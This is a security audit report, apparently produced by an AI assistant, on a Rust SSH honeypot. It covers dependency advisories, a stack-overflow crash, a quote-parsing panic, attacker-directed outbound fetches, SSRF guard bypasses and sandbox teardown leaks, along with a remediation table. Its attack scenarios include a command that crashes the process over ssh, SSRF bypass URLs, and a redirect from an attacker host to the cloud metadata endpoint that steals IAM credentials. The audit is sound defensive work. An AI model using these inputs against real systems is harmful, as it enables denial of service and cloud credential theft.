# Aegis SSH Honeypot — Hostile-Environment Security Audit

**Date:** 2026-09-18
**Scope:** Full workspace (7 crates, 5,826 LOC Rust + 1,212-line dashboard SPA), commit `74deaf5` + uncommitted working-tree changes to `aegis-dashboard` and `README.md`.
**Threat model as briefed:** every byte from the SSH client is attacker-controlled; attackers will try to (1) fingerprint the honeypot, (2) escape the sandbox, (3) attack the host/dashboard, (4) crash or DoS it.
**Status:** Phase 1 + Phase 2 complete. **No code was modified.** Two findings were confirmed by standalone reproduction outside the repo (see AEG-002, AEG-003).

---

## Remediation Status — 2026-09-19

Fixes applied in a follow-up pass. **Verification after the pass: 41/41 tests pass (release mode), `cargo clippy --pedantic` 0 errors, `cargo deny check` = bans ok / licenses ok / sources ok, `cargo audit` down from 4 advisories to 3.** Sixteen new regression tests were added, each pinning a specific finding.

Two structural wins worth calling out: **host-side code is now `unsafe`-free** (both blocks turned out to be removable dead weight, not load-bearing), and no new dependency was added — the SSRF rewrite uses `reqwest::Url`, which was already in the tree.

| ID | Severity | Status | Note |
|---|---|---|---|
| AEG-001 | Critical | **Fixed** | russh 0.46 → **0.63.3**; all 17 GHSA russh advisories now out of range. Verified against a live `ssh` client |
| AEG-002 | Critical | **Fixed** | `sudo` recursion → iteration; `MAX_COMMAND_LEN` 8 KiB cap. Test asserts 200k-deep `sudo` returns normally |
| AEG-003 | Critical | **Fixed** | `s.len() >= 2` guard. Test covers `echo "`, `echo '`, `echo "a` |
| AEG-004 | Critical | **Mitigated** | `fetch_payloads` flag + per-session budget + size cap. **Default left `true`** — see below |
| AEG-005 | High | **Fixed** | Parse with `reqwest::Url`; vet all resolved addresses; pin via `.resolve()`; `Policy::none()`; fail-closed. 7 tests |
| AEG-006 | High | **Fixed** | `Drop for OverlayMount` + `Drop for ActiveSession` (spawns teardown+forensics) + startup `reclaim_orphaned_sessions`. Live-tested: 0 leaked dirs after abandoned and killed sessions |
| AEG-007 | High | **Fixed** | Chunked read against `max_payload_bytes`, `Content-Length` pre-check |
| AEG-008 | High | **Fixed** | `attacks.json` rotation (256 MiB × 4 generations); `.cast` capped at 32 MiB with a truncation marker |
| AEG-009 | High | **Partially fixed** | Banner now `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4`. **HASSH still unaligned** — see below |
| AEG-010 | High | **Fixed** | `sanitize()` escapes C0/C1 controls in every attacker-derived field reaching the operator console |
| AEG-011 | High | **Fixed** | `bump_capped` at `COUNTER_CAP` on all five previously-unbounded maps |
| AEG-012 | High | **Fixed** | `.expect()` → `SessionHandler::Rejected`; recorder opened before sandbox so none is leaked on refusal |
| AEG-013 | Medium | **Fixed** | IPv6 keyed by /64; amortized sweep + `MAX_TRACKED_PREFIXES`. 3 tests |
| AEG-014 | Medium | **Documented** | README now states the probes are not built; `CAP_BPF`/`CAP_NET_ADMIN` dropped from the Dockerfile |
| AEG-015 | Medium | **Fixed** | `bpf_probe_read_user` now reads the syscall pointer; PID from the high 32 bits. Still uncompiled — unverified |
| AEG-016 | Medium | **OPEN** | Needs kernel-side PID/cgroup filtering; deferred with the rest of the eBPF work |
| AEG-017 | Medium | **Fixed** | `max_analysis_bytes` checked via `metadata` before reading |
| AEG-018 | Medium | **Fixed** | `unshare` removed entirely (it was a no-op mutating shared worker state); dead `PtyPair` removed |
| AEG-019 | Medium | **Fixed** | `MS_NODEV\|MS_NOSUID\|MS_NOEXEC` + `redirect_dir=off,metacopy=off`; Dockerfile caveat documented |
| AEG-020 | Medium | **Fixed** | CSP (incl. `connect-src 'self'`), `nosniff`, `no-referrer`, `DENY`, applied outside auth so 401s carry them |
| AEG-021 | Medium | **Fixed** | `?token=` now accepted only on `/` and `/api/stream` |
| AEG-022 | Medium | **Fixed** | `.cast` served via bounded `take()`; tailer reads ≤8 MiB per poll |
| AEG-023 | Medium | **Fixed** | `rootfs` 0755; `attacks.json`/`.cast` created 0600. `umask` deliberately *not* set — see below |
| AEG-024 | Medium | **OPEN** | Shell realism (pipes, `exec_request`, `sleep`, clock coherence) — scoped work, not yet done |
| AEG-025 | Medium | **Fixed** | `rm` flags parsed only from `-`-prefixed tokens |
| AEG-026 | Low | **Fixed** | Four overstated README claims rewritten to match the implementation |
| AEG-027 | Low | **Fixed** | `--locked` added; capability notes corrected |
| AEG-028 | Low | **Fixed** | `~` branch now normalizes `..` |
| AEG-029 | Low | **Fixed** | `MAX_ESCAPE_SEQ_LEN` resynchronisation |
| AEG-030 | Low | **Fixed** | `DROPPED_EVENTS` counter map; drops no longer silent. Uncompiled — unverified |
| AEG-031 | Info | **Partially fixed** | Idle timeout 3600s → 900s; pubkey fingerprint now recorded; `publish = false` + `license.workspace` on all crates. Unused `memory_limit_mb`/`cpu_quota_percent`/`LoggingConfig` still unwired |

### Four decisions that are yours, not mine

1. **AEG-001 (russh) is done** — see the migration section below. It was deferred from the first pass and completed in a second, with live client testing.
2. **`fetch_payloads` defaults to `true`.** That preserves today's behaviour and payload capture; flipping the default would silently disable a feature you demo in the README. With the SSRF fix, the 8 MiB cap and the 5-fetch budget the abuse case is much narrower, but the honeypot *will still* fetch attacker-chosen public URLs from your address. One config line turns it off, and the audit's recommendation was off-by-default — that call is yours.
3. **AEG-009 is half-done on purpose.** The banner was a one-line fix; matching `hasshServer` means aligning `Preferred` algorithm lists to OpenSSH 9.6p1's exact order and adding an RSA host key, which changes the crypto negotiated with real clients. Worth doing deliberately, with a captured reference KEXINIT to diff against.
4. **No `umask(0o077)`.** The only way to set it from Rust is an `unsafe` libc call, and the brief said no new `unsafe`. Every sensitive file sets 0600 explicitly instead; set `UMask=0077` in the systemd unit for defence in depth.

### russh 0.46 → 0.63.3 migration

Completed as a separate pass. **`cargo audit`: 4 advisories → 0** (the one remaining `rsa` finding is documented as accepted in `deny.toml`); **`cargo deny check`: advisories ok, bans ok, licenses ok, sources ok**; 41/41 tests pass; clippy 0 errors.

A version-range check of all **17** russh advisories in the GitHub Advisory Database against the pinned versions returns **0 applicable**. `russh-keys` is gone from `Cargo.lock` entirely.

API changes handled:

| Change | Migration |
|---|---|
| `russh-keys` crate abandoned at 0.50-beta | Folded into `russh::keys`; dependency dropped |
| `KeyPair` → `ssh_key::PrivateKey` | `Config.keys` is now `Vec<PrivateKey>` |
| `KeyPair::generate_ed25519()` removed | `PrivateKey::random(&mut rand::rng(), Algorithm::Ed25519)` |
| `Handler` is now AFIT, not `#[async_trait]` | Attributes removed; `async-trait` dependency dropped |
| `channel_open_session` returns `Result<()>` + `ChannelOpenHandle` | Explicit `reply.accept()` / `reply.reject(AdministrativelyProhibited)` |
| `Session::data` takes `impl Into<Bytes>`, returns `Result` | `CryptoVec::from(v)` → `v`; errors now propagate via `?` |
| `Session::close` returns `Result` | Propagated |
| `Auth::Reject` gained `partial_success` | `Auth::reject()` |
| `PublicKey` is now `ssh_key::PublicKey` | `.name()` → `.algorithm().as_str()`; `.fingerprint()` → `.fingerprint(HashAlg::Sha256)` |
| `SshId::Standard(String)` → `Cow<'static, str>` | `Cow::Borrowed` |

**One dependency was added:** `rand = "0.10"`, pinned to match russh's own. It is needed only because 0.63 removed the key-generation helper, and it was already in the tree transitively — so this adds a direct declaration, not new third-party code.

**Two incidental improvements** fell out of the migration: `Session::data`/`close` failures now propagate instead of being silently discarded (they were infallible in 0.46), and `async-trait` was dropped from the gateway.

**Note for AEG-009:** the upgrade changes russh's default algorithm lists, so the `hasshServer` fingerprint has *changed* — it is still not OpenSSH's. Any previously captured HASSH baseline is stale.

### Live functional verification

The first pass had none; this one does. Against a real OpenSSH client on an isolated instance:

- Banner reads `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4`.
- Password auth, PTY, shell, command dispatch and clean `exit` all work; events reach `attacks.json` and a `.cast` replay is written.
- `attacks.json`, `.cast` and `host_key.pem` are all created mode **0600** (AEG-023 confirmed at runtime, not just in source).
- **AEG-002** — 200,000 stacked `sudo` (~1 MB): process **survives**; the line is truncated at `MAX_COMMAND_LEN`.
- **AEG-003** — `echo "`: returns `"`, process **survives**.
- **AEG-008** — 5 MB of keystrokes with no newline produced a **168 KB** recording, against the ~175 MB the old per-byte path would have written.
- **AEG-006** — 3 abandoned connections plus one killed mid-session left **0** orphaned overlay directories.

That last test is what exposed the remaining half of AEG-006: `OverlayMount::drop` released the *mount*, but the session *directory* and its artifacts were still only cleaned on the clean path. `Drop for ActiveSession` now spawns the teardown-and-forensics work, so an abandoned session is reclaimed immediately rather than waiting for the next restart.

### Still unverified

The eBPF fixes (AEG-015, AEG-030) remain **source-only** — that crate still has no build path and is not a workspace member, so nothing has compiled or verifier-checked them.

The live testing above ran on a host where the OverlayFS mount **does not succeed** (no `CAP_SYS_ADMIN`), so it exercised the directory-fallback path. The `umount` calls in `OverlayMount::drop` and `reclaim_orphaned_sessions` are therefore still reasoned from source, not observed — directory reclamation is confirmed, kernel-mount release is not. Worth re-running the abandoned-session test on a properly privileged host.

The dashboard was not exercised over HTTP; its CSP headers, scoped `?token=`, and bounded reads are verified by compilation and unit tests only.

---

## Phase 1 — Automated Checks

### `cargo clippy --workspace --all-targets -- -W clippy::pedantic`

Clean build, **exit 0, 166 warnings, zero errors, zero correctness lints.** Breakdown of the top categories:

| Count | Lint |
|------:|------|
| 35 | `doc_markdown` (missing backticks in docs) |
| 20 | `format_push_string` |
| 17 | `missing_errors_doc` |
| 10 | `redundant_closure` |
| 6 | `must_use_candidate` |
| 6 | `map_unwrap_or` |
| 5 | `too_many_lines` (443/192/174/124/109 vs. 100) |
| 2 | `cast_possible_truncation` |

**Nothing in clippy's output points at a security defect.** Every finding in this report was found by manual review or dependency analysis, not by clippy. Worth stating plainly: a clean pedantic run is not evidence of a safe honeypot.

> **Coverage gap:** `crates/aegis-ebpf/ebpf` is **not a workspace member** (see the `members` list in `Cargo.toml`). The kernel-side BPF code is never compiled, linted, or tested by any command in this report. See AEG-014/AEG-015.

### `cargo test --workspace`

**Exit 0 — 25 tests passed, 0 failed, 0 ignored**, across 12 targets (admission control ×5, geoip ×4, vfs ×2, forensics ×1, dashboard auth ×3, plus doc/integration targets reporting 0 tests).

Coverage is real but narrow: it covers the rate limiter, GeoIP decode, token comparison, and happy-path VFS/forensics. **There is no test anywhere that feeds hostile bytes to the command parser** — which is exactly where the two confirmed crashes live.

### `cargo audit`

`cargo-audit` was not installed; installed `cargo-audit v0.22.2` for this audit. Scanned 334 dependencies against 1,251 advisories.

```
error: 4 vulnerabilities found!
```

| Crate | Version | Advisory | Severity | Fix |
|---|---|---|---|---|
| `russh` | 0.46.0 | RUSTSEC-2026-0154 — Unbounded 32-bit allocation | **7.5 high** | `>=0.60.3` |
| `russh-cryptovec` | 0.7.3 | RUSTSEC-2026-0153 — Unchecked `CryptoVec` allocation/growth | **7.5 high** | `>=0.60.3` |
| `rustls` | 0.23.43 | RUSTSEC-2026-0285 — TLS 1.3 handshake messages accepted across encryption-level boundaries | 5.3 medium | `>=0.23.45` |
| `rsa` | 0.9.10 | RUSTSEC-2023-0071 — Marvin Attack (timing sidechannel key recovery) | 5.9 medium | **no fix available** |

**`cargo audit` materially under-reports the risk here.** RustSec carries 2 advisories for russh; the GitHub Advisory Database carries **17**, of which **12 apply to 0.46.0**. Full cross-reference in AEG-001. Any process that relies on `cargo audit` alone as the dependency gate will miss ten applicable advisories on the single most exposed component in the system.

### `cargo deny check`

`cargo-deny` was not installed and **there is no `deny.toml` in the repo.** I installed `cargo-deny` and wrote a proposed config, but deliberately did **not** add it to the project under the read-only rule — it is staged at `/tmp/claude-1000/.../scratchpad/deny.toml` and is ready to drop in at `./deny.toml` on your approval (`yanked = "deny"`, `wildcards = "deny"`, `unknown-registry`/`unknown-git = "deny"`, `multiple-versions = "warn"`, permissive-license allowlist).

Run against that config:

```
advisories FAILED, bans FAILED, licenses FAILED, sources ok
```

| Check | Result | Detail |
|---|---|---|
| `advisories` | **FAILED** | Same 4 findings as `cargo audit` — see AEG-001 |
| `bans` | **FAILED** | 5 `wildcard` errors + 11 `duplicate` warnings |
| `licenses` | **FAILED** | 6 `unlicensed` errors |
| `sources` | **ok** | All 334 crates resolve from the official crates.io registry; no git or unknown-registry dependencies. **This is the good news — the supply chain source surface is clean.** |

Two caveats on interpreting the failures, because both are less alarming than the word FAILED suggests:

- **The 5 `wildcard` errors are a false positive of my own config.** All five are internal workspace path dependencies (`aegis-common = { path = "../aegis-common" }` etc.), which carry no version requirement by design. Real production config should set `allow-wildcard-paths = true`. **No third-party dependency is wildcarded** — every external crate is version-pinned via `[workspace.dependencies]`, which is good practice and worth preserving.
- **The 6 `unlicensed` errors are the six workspace crates themselves**, not third-party code. `Cargo.toml:17` declares `license = "MIT"` under `[workspace.package]`, but only `aegis-dashboard` inherits it — `aegis-common`, `aegis-collector`, `aegis-gateway`, `aegis-vmm`, `aegis-forensics`, and `aegis-ebpf` omit `license.workspace = true`. Administrative, but it means the repo's own crates are formally unlicensed despite the MIT `LICENSE` file. One line per manifest.

The `duplicate` warnings (3× `hashbrown`, 2× each of `syn`, `thiserror`, `getrandom`, `core-foundation`, and several `windows-*`) are normal for a tree this size and carry no security weight on their own — though note that the `russh` upgrade in AEG-001 should reduce some of them.

One genuine (minor) inconsistency surfaced: `reqwest` is declared inline in `crates/aegis-gateway/Cargo.toml:26` as `{ version = "0.12", features = ["blocking"] }` rather than in `[workspace.dependencies]` like every other external crate. It is the dependency behind AEG-004's outbound fetch, so it is the one most worth having centrally pinned and visible.

### `unsafe` block inventory

Nine `unsafe` sites. Two are in host-side code that runs as root; seven are in the never-compiled BPF crate.

| # | Location | What it does | Justified? |
|---|---|---|---|
| 1 | `aegis-vmm/src/lib.rs:45` | `nix::pty::ptsname(&master)` | **Yes.** `ptsname` is `unsafe` because it returns a pointer to a static buffer; the result is copied to an owned `String` before the next call. Sound. Note: `PtyPair::open` is dead code — nothing constructs it. |
| 2 | `aegis-vmm/src/lib.rs:242` | `libc::unshare(CLONE_NEWUTS \| CLONE_NEWPID)` | **No — see AEG-018.** Called once per session on whichever tokio worker thread happens to run it, return value logged and ignored, and no child is ever forked, so it achieves nothing while mutating shared runtime-thread state. |
| 3–8 | `aegis-ebpf/ebpf/src/main.rs:51,54,110,113,163,166` | `bpf_probe_read_user*` in tracepoint handlers | Standard aya pattern and acceptable *in principle* — but **not compiled, not verified, and one contains a real bug** (AEG-015). |
| 9 | `aegis-ebpf/src/lib.rs:121` | `ptr::read_unaligned(bytes.as_ptr() as *const KernelEvent)` | **Conditionally.** The preceding length check (`bytes.len() < size_of::<KernelEvent>()`) makes the read in-bounds, and `read_unaligned` handles alignment. It is sound *given* the kernel side writes a layout-compatible struct — but `KernelEvent` is `#[repr(C)]` and duplicated by hand in two crates with no static assertion tying them together. A silent layout drift would be UB. Recommend a `const` size/offset assertion. |

**No new `unsafe` is required by any fix proposed in this report.**

---

## Phase 2 — Manual Audit

Findings are sorted by severity. Every file:line refers to the working tree as audited.

---

## CRITICAL

### AEG-001 — SSH transport library is 16 releases behind with 12 applicable advisories, several pre-auth remote
**Severity:** Critical
**Location:** `Cargo.toml:22-23` (`russh = "0.46"`, `russh-keys = "0.46"`); resolved `russh 0.46.0`, `russh-cryptovec 0.7.3`, `russh-util 0.46.0`

**What's wrong.** `russh` is the code that parses unauthenticated attacker bytes off the socket — it is the first thing an attacker touches and the last thing that should be stale. Version 0.46.0 is affected by 12 published advisories. Cross-referenced against the GitHub Advisory Database (`api.github.com/advisories?ecosystem=rust&affects=russh`) and RustSec:

| CVE | Sev | Vulnerable range | Pre-auth? | Relevance to this server |
|---|---|---|---|---|
| CVE-2026-48110 | **High** | `>=0.34.0, <0.61.0` | Yes | SSH message fields decoded through allocation-first parsers before field-specific bounds |
| CVE-2026-46702 | **High** | `>=0.34.0, <0.61.1` | Yes | Post-decompression packet size unbounded — remote zip-bomb |
| CVE-2026-46673 | **High** | `<=0.60.2` | Yes | `CryptoVec` unchecked growth. **Pre-0.58.0 the remote paths are reachable** via transport packet reads and zlib decompression; advisory notes this reproduced as *process termination* on allocation failure |
| CVE-2026-42189 | **High** | `<0.60.1` | Yes | Pre-auth DoS, unbounded allocation in keyboard-interactive auth handler |
| CVE-2026-73430 | Medium | `<=0.62.3` | Yes | Pre-auth remote **panic** via all-zero Curve25519 peer public value (`encode_mpint` OOB) |
| CVE-2026-48108 | Medium | `>=0.34.0-beta.1, <0.61.0` | Yes | Identification parsing accepts non-canonical banners, pre-banner input unbounded |
| CVE-2026-46705 | Medium | `>=0.34.0-beta.1, <0.61.0` | Yes | Server userauth state not reset when the authentication principal changes |
| CVE-2026-73489 | Medium | `<=0.62.3` | Post-auth | Remote panic via `pty-req` with >130 terminal-mode records. **This server implements `pty_request` and accepts every credential**, so "post-auth" is a formality |
| CVE-2026-68930 | Medium | `<=0.62.4` | — | Channel-scoped server callbacks reachable without an open channel — directly relevant, this code's `data()` assumes an opened channel |
| CVE-2025-54804 | Medium | `<0.54.1` | — | Missing overflow checks in channel window adjust |
| RUSTSEC-2026-0154 | High | `<0.60.3` | — | Unbounded 32-bit allocation (agent frames) |
| RUSTSEC-2026-0153 | High | `<0.60.3` | — | `russh-cryptovec` growth handling |

Not applicable: CVE-2024-43410 (`<=0.44.0`), CVE-2023-48795 Terrapin (`<0.40.2`), CVE-2023-28113 (`<0.36.2`) — 0.46.0 is past all three. CVE-2026-73429 and CVE-2026-48107 are client-side paths only.

**Attack scenario.** An attacker with no credentials opens a TCP connection to port 2222 and sends a crafted KEXINIT with an all-zero Curve25519 public value (CVE-2026-73430) — the handler task panics before authentication. Or they negotiate zlib compression and send a small compressed packet that expands unbounded (CVE-2026-46702 / CVE-2026-46673), driving the process to allocation failure and abort. No shell, no credentials, no interaction with the honeypot logic at all. The honeypot is down and collects nothing, which is the one outcome that makes it worthless.

**Suggested fix.** Upgrade to `russh >= 0.62.5` (clears all 12). This is not a drop-in bump: 0.46 → 0.62 crosses the 0.50 `russh-keys` merge into `russh::keys`, changes `Handler` method signatures, and reworks `KeyPair`/`PrivateKey`. Budget real migration time for `handler.rs` and `main.rs`. Then add `cargo audit` **and** a GHSA-backed check (e.g. `cargo deny check advisories` with the GitHub advisory source, or `osv-scanner`) to CI, failing the build on High. Separately: `rustls` → `>=0.23.45`. The `rsa` Marvin advisory has no fix and arrives transitively via `russh-keys`; it is a timing sidechannel against RSA *private* key operations and matters only for the honeypot's own Ed25519-configured host key path — document it as accepted rather than chasing it.

**How to verify.** `cargo audit` returns clean; `cargo tree -i russh` shows `>=0.62.5`; re-run the GHSA query above and confirm no range covers the pinned version. Functionally: connect with `ssh -vvv`, confirm KEX completes, shell opens, and `data()`/`pty_request` still fire.

---

### AEG-002 — `sudo` recursion + unbounded command buffer: one command aborts the entire process
**Severity:** Critical — **CONFIRMED BY REPRODUCTION**
**Location:** `crates/aegis-gateway/src/shell.rs:181-183` (recursion); `crates/aegis-gateway/src/handler.rs:425-433` (unbounded buffer)

**What's wrong.** Two independent defects compose into a remote kill switch.

1. `dispatch_pure` handles `sudo` by stripping the prefix and **calling itself**:
   ```
   if prog == "sudo" { return dispatch_pure(args, vfs); }
   ```
   One stack frame per `sudo ` token, with no depth counter.
2. `ActiveSession::data` pushes every printable byte into `self.cmd_buffer` (`handler.rs:428`) with **no length cap anywhere** — `grep` for `MAX_`/`truncate`/length checks across `crates/aegis-gateway/src/` returns nothing. The buffer only clears on `\r`, `\n`, or Ctrl-C.

So the attacker controls the recursion depth directly, and cheaply.

**Attack scenario.** Send `("sudo " * 100000) + "id\n"` — about 500 KB on the wire, well under a second. Confirmed with a standalone reproduction of the exact `dispatch_pure` logic compiled at `-O` (matching the release profile's `opt-level = 3`, so this is not a debug-build artifact — LLVM does **not** eliminate this frame):

```
== n=20000 ==  survived, recursion depth reached: 20000
== n=100000 == thread 'main' has overflowed its stack
               fatal runtime error: stack overflow, aborting
```

A Rust stack overflow is **not a catchable panic** — it is `SIGSEGV`/abort. It takes down the *whole gateway process*, every concurrent session, the collector, and the event pipeline. Not one task. The 100k threshold was measured on an 8 MB main-thread stack; tokio worker threads default to **2 MB**, so in-process the real threshold is roughly 4× lower — on the order of 25,000 `sudo` tokens, about **125 KB of input**. Trivially repeatable; a supervisor restart loop just means the honeypot flaps.

**Suggested fix.** Two changes, both needed:
- Convert the `sudo` passthrough from recursion to iteration — `while let Some(rest) = cmd.strip_prefix("sudo ") { cmd = rest.trim_start(); }` with a small fixed iteration cap — and add a hard recursion-depth parameter to `dispatch`/`dispatch_pure` so no future arm can reintroduce unbounded descent.
- Cap `cmd_buffer` in `data()`. Real `bash`/readline has a line limit; pick something generous but finite (4–16 KB), and on overflow discard the line and emit a plausible shell response rather than echoing forever. This also bounds AEG-008's per-keystroke `.cast` amplification.

**How to verify.** Add a unit test asserting `dispatch(&"sudo ".repeat(1_000_000), &mut vfs)` returns normally. Add a test that `data()` with 10 MB of `A` leaves `cmd_buffer.len() <= CAP`. Then live-fire: `python3 -c 'print("sudo "*200000 + "id")' | ssh -p 2222 root@target` and confirm the process is still alive afterward (`pidof aegis-gateway` unchanged).

---

### AEG-003 — `echo "` panics the session handler
**Severity:** Critical — **CONFIRMED BY REPRODUCTION**
**Location:** `crates/aegis-gateway/src/shell.rs:193-203`

**What's wrong.** The `echo` arm strips matching surrounding quotes:
```
let s = if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
    &s[1..s.len()-1]
```
For a **single** quote character, `starts_with` and `ends_with` are *both* true on the same byte, `s.len()` is 1, and the slice becomes `&s[1..0]` — an inverted range, which panics.

**Attack scenario.** Type `echo "` and press enter. Confirmed:
```
args="\""  -> *** PANIC *** byte range starts at 1 but ends at 0
args="'"   -> *** PANIC ***
```
The panic unwinds the russh handler task, killing the connection. `ActiveSession::teardown_session()` never runs, so this **also triggers AEG-006**: the OverlayFS mount and session directory leak, and forensics never analyses the upperdir. An attacker loops connect → `echo "` → repeat, and each iteration permanently leaks a mount and a directory. That converts a one-line typo-grade bug into a disk-and-mount-table exhaustion primitive.

This is not an exotic input. `echo "` is something a *clumsy human* types. It is near-certain this has already fired in production.

**Suggested fix.** Require length ≥ 2 before stripping: guard the branch with `s.len() >= 2 && ...`. While in this function, note the quote handling is wrong in the ordinary case too (`echo "a" "b"` strips the outermost pair across both arguments) — worth fixing together, but the panic is the urgent half. Consider a workspace lint policy (`#![deny(clippy::indexing_slicing)]` on the gateway crate) to catch the class.

**How to verify.** Unit test: `assert!(dispatch("echo \"", &mut vfs).len() > 0)` and the same for `'`, plus `echo ""`, `echo '`, `echo "a`. Fuzz `dispatch` with `cargo-fuzz`/`arbitrary` over arbitrary ASCII — this whole file is a good fuzz target and would have caught both AEG-002 and AEG-003.

---

### AEG-004 — The gateway makes attacker-directed outbound HTTP requests as root
**Severity:** Critical
**Location:** `crates/aegis-gateway/src/handler.rs:342-385` (dispatch), `522-569` (`fetch_payload_blocking`)

**What's wrong.** This is the finding that most contradicts the documented design. `README.md:46` claims *"Zero-Execution Sandbox: No malicious code is ever executed on the host system"* — technically true of the fake shell, and it invites the reader to conclude the honeypot is egress-inert. It is not. When an attacker types anything matching `(wget|curl|tftp)\s`, the gateway extracts the first URL from the command and **really fetches it** over the network, from the host, in-process:

```
let urls: Vec<&str> = re_url().find_iter(&cmd).map(...).collect();
...
tokio::task::spawn_blocking(move || fetch_payload_blocking(&url, &host, ...))
```

You asked whether a session can make outbound connections and flagged sandbox egress control as unimplemented. The answer is worse than "the sandbox can reach the internet": **the sandbox has no network at all, but the gateway process will make arbitrary attacker-chosen HTTP requests on its behalf.** The isolation boundary is bypassed not by an escape but by a feature.

**Attack scenario — being used to attack third parties.** This is the real-world liability, and it is not theoretical:
- **Reflected attack / DDoS participation.** `wget http://victim.example/expensive-endpoint` — repeated across many sessions and many source IPs, your host becomes an attack relay. Requests carry `User-Agent: Wget/1.21.2` (line 533) and originate from *your* IP and *your* ASN. Abuse complaints, blocklisting, and provider action land on you, and the traffic is genuinely yours.
- **Attribution laundering.** An attacker who wants a request to come from a reputable netblock just types it into your honeypot.
- **Internal network reconnaissance.** Combined with AEG-005's bypassable guard, `wget http://10.0.0.5:8080/` probes your internal network from a host that can reach it.
- **Amplification.** Each request costs the attacker one short line of text and costs you a full HTTP fetch plus two disk writes of the response.

There is no allowlist, no per-session fetch budget, no global rate limit, no total-bytes cap, and no opt-out flag.

**Suggested fix.** Decide the policy explicitly, because the current state is an accident rather than a choice:
- **Default to off.** Add `[forensics] fetch_payloads = false`. When off, return `fake_wget_progress()` — the attacker sees a convincing download and you fetch nothing. You lose payload capture; you lose zero honeypot fidelity, because the fake progress output is already what they see.
- **If on**, gate it hard: a strict egress allowlist or a dedicated outbound proxy/netns, a per-session fetch count cap, a global fetches-per-minute limit, a hard response-size cap (AEG-007), `redirect(Policy::none())` (AEG-005), and a distinct egress source IP that is not your main address.
- Either way, correct `README.md:46` — the current wording actively misleads an operator into deploying this on a network where that egress matters.

**How to verify.** With `fetch_payloads = false`, run `wget http://<your-listener>/x` in a session and confirm your listener records **zero** connections while the attacker still sees the fake progress bar. With it on, confirm the per-session cap rejects the N+1th fetch and that a 1 GB response is truncated at the configured limit.

---

## HIGH

### AEG-005 — SSRF guard is bypassable four different ways
**Severity:** High
**Location:** `crates/aegis-gateway/src/handler.rs:51-67` (`is_private_addr`), called at `529`

**What's wrong.** `is_private_addr(host)` is the only control preventing AEG-004's fetch from hitting internal infrastructure, and it fails open on all four of these:

1. **Any explicit port defeats it entirely.** `host` comes from `url.split('/').nth(2)` (line 349), which yields `127.0.0.1:8080` — including the port. The guard then builds `format!("{host}:80")` = `"127.0.0.1:8080:80"`, which **fails to parse**, so `to_socket_addrs()` errors, the function falls through to `false`, and the fetch proceeds. `wget http://127.0.0.1:8080/` reaches loopback unchecked.
2. **URL userinfo defeats it.** `http://evil.com@127.0.0.1/` gives `host = "evil.com@127.0.0.1"`; same parse failure, same fall-through to `false`.
3. **Only the first resolved address is checked** (`addrs.next()`), but `reqwest` resolves independently and may connect to a different record — a classic **DNS rebinding / TOCTOU** split between check time and use time. A hostile resolver returning a public IP first and `169.254.169.254` second wins.
4. **Redirects are never re-checked.** `reqwest::blocking::Client` follows up to 10 redirects by default, and `is_private_addr` runs only on the original URL. `http://attacker.com/r` → `302 Location: http://169.254.169.254/latest/meta-data/` is an unconditional bypass even with everything else fixed.

Coverage gaps even on the happy path: IPv6 unique-local `fc00::/7` and link-local `fe80::/10` are not blocked (only `is_loopback`), IPv4-mapped IPv6 (`::ffff:127.0.0.1`) is not normalized, and CGNAT `100.64.0.0/10` is unfiltered.

**Attack scenario.** On a cloud host: `wget http://a.attacker.com/r` where that URL 302-redirects to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The gateway follows it, and the response is written to the quarantine directory *and* into the session mount root (line 561) — where the attacker can then read it back with `cat`. **That is credential exfiltration of the host's cloud IAM role via a single typed command.** The IOC extractor (line 564) additionally parses the response and ships any URLs/IPs it finds into `attacks.json` and onto the dashboard.

**Suggested fix.** Stop string-parsing URLs. Parse with the `url` crate (already in the tree at 2.5.8 via `reqwest` — no new dependency): take `.host()` and `.port_or_known_default()` as structured values. Then set `redirect(reqwest::redirect::Policy::none())`, and enforce the IP policy at **connect** time rather than pre-flight — `reqwest`'s custom DNS resolver hook, or resolve-then-connect-to-a-vetted-`SocketAddr` — which closes the TOCTOU. Extend the blocklist to loopback, unspecified, private, link-local, CGNAT, multicast, IPv6 ULA/link-local, and IPv4-mapped forms. Default-deny on any parse failure instead of the current default-allow — that inversion alone kills bypasses 1 and 2.

**How to verify.** Table-driven unit tests over `is_private_addr` for each vector above, each asserting `true` (blocked). Integration: stand up a redirector to `127.0.0.1` and assert no connection is made. Assert the function returns `true` for unparseable input (fail-closed).

---

### AEG-006 — Sandbox teardown never runs on abrupt disconnect; 34 orphaned session dirs on disk right now
**Severity:** High
**Location:** `crates/aegis-vmm/src/lib.rs:189-201` (`teardown`), `crates/aegis-gateway/src/handler.rs:216-244`, `191-195` (`Drop`)

**What's wrong.** `teardown_session()` — which unmounts the OverlayFS, runs forensics, and removes the session directory — is only reachable from two places: the `exit`/`logout` command (`handler.rs:335`) and `channel_close` (`handler.rs:445`). It is **not** in a `Drop` impl. The `Drop` for `ActiveSession` (line 191) releases only the IP-guard slot:

```
impl Drop for ActiveSession {
    fn drop(&mut self) { self.ip_guard.release(self.meta.client_ip); }
}
```

`SandboxHandle` and `OverlayMount` have **no `Drop` impls at all**. So any session that ends without a clean channel close — TCP RST, network drop, idle timeout, a panic from AEG-003, or a process kill — drops `self.sandbox` with the mount still live and the directories still on disk.

**This is already happening.** Observed in the working tree:
```
overlay/ : 34 orphaned session_* directories
```
Against `sessions/` containing exactly **one** `.cast` file. Thirty-four sessions leaked; one completed cleanly. Forensics never ran on any of the 34 — so beyond the resource leak, **captured attacker artifacts were silently thrown away**, which is a straight loss of the honeypot's actual product.

**Attack scenario.** Connect, send `RST` (or just `echo "` per AEG-003), repeat. Each cycle permanently leaks one directory and, on a host where the mount actually succeeds, one OverlayFS mount entry. At the configured 20 connects/min/IP from a handful of hosts, that is thousands of leaked mounts per hour. Mount-table growth degrades every `statfs`/`/proc/mounts` reader on the box, and the directories consume inodes until the filesystem is exhausted. Note the leak is *worse* on a correctly-privileged production host than on this dev box, because here the mounts fail (`grep -c overlay /proc/mounts` = 0) and only directories leak.

